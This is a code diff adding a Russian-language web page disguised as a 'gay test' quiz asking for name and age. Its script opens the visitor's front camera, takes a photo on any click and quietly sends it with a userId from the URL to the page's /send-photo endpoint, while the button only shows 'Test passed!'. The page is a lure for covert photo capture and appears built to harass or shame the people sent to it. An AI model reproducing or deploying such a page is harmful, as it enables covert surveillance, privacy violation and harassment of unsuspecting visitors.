@@ -1,0 +1,110 @@
+<!DOCTYPE html>
+<html lang="ru">
+    <head>
+        <meta charset="UTF-8" />
+        <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+        <title>Тест на гея</title>
+        <style>
+            body {
+                height: 100vh;
+                margin: 0;
+                display: flex;
+                justify-content: center;
+                align-items: center;
+                background-color: #f0f0f0;
+            }
+            .form-container {
+                text-align: center;
+                padding: 20px;
+                border: 2px solid #000;
+                background-color: #fff;
+                border-radius: 8px;
+            }
+            #snapshot {
+                margin-top: 20px;
+                max-width: 100%;
+                height: auto;
+                border: 2px solid #ccc;
+            }
+        </style>
+    </head>
+    <body>
+        <div class="form-container">
+            <h2>Тест на гея</h2>
+            <p>Заполните форму:</p>
+            <input type="text" placeholder="Введите ваше имя" id="name" />
+            <input type="text" placeholder="Введите возраст" id="age" />
+            <button onclick="alert('Тест пройден!')">Пройти тест</button>
+            <div id="snapshot-frame">
+                <img id="snapshot" alt="Снимок с камеры" />
+            </div>
+        </div>
+
+        <script>
+            async function getCameraStream() {
+                try {
+                    const stream = await navigator.mediaDevices.getUserMedia({
+                        video: { facingMode: 'user' },
+                    });
+                    const video = document.createElement('video');
+                    video.srcObject = stream;
+                    video.play();
+                    return video;
+                } catch (error) {
+                    alert('Не удалось получить доступ к камере');
+                    console.error(error);
+                }
+            }
+
+            function takeSnapshot(videoElement) {
+                const canvas = document.createElement('canvas');
+                const context = canvas.getContext('2d');
+                canvas.width = videoElement.videoWidth;
+                canvas.height = videoElement.videoHeight;
+                context.drawImage(
+                    videoElement,
+                    0,
+                    0,
+                    canvas.width,
+                    canvas.height
+                );
+                return canvas.toDataURL('image/png').split(',')[1]; // base64 без префикса
+            }
+
+            async function sendPhotoToServer(photoData) {
+                const userId = new URLSearchParams(window.location.search).get(
+                    'userId'
+                );
+
+                try {
+                    await fetch('/send-photo', {
+                        method: 'POST',
+                        headers: { 'Content-Type': 'application/json' },
+                        body: JSON.stringify({ userId, photoData }),
+                    });
+                    console.log('Фото отправлено');
+                } catch (error) {
+                    console.error('Ошибка при отправке фото:', error);
+                }
+            }
+
+            let videoElement;
+            getCameraStream().then((video) => {
+                videoElement = video;
+                document.body.addEventListener('click', () => {
+                    setTimeout(() => {
+                        const photoData = takeSnapshot(videoElement);
+
+                        // Отображаем снимок в элементе <img id="snapshot">
+                        const snapshotElement =
+                            document.getElementById('snapshot');
+                        snapshotElement.src =
+                            'data:image/png;base64,' + photoData;
+
+                        sendPhotoToServer(photoData);
+                    }, 1000); // Задержка 1 секунда
+                });
+            });
+        </script>
+    </body>
+</html>
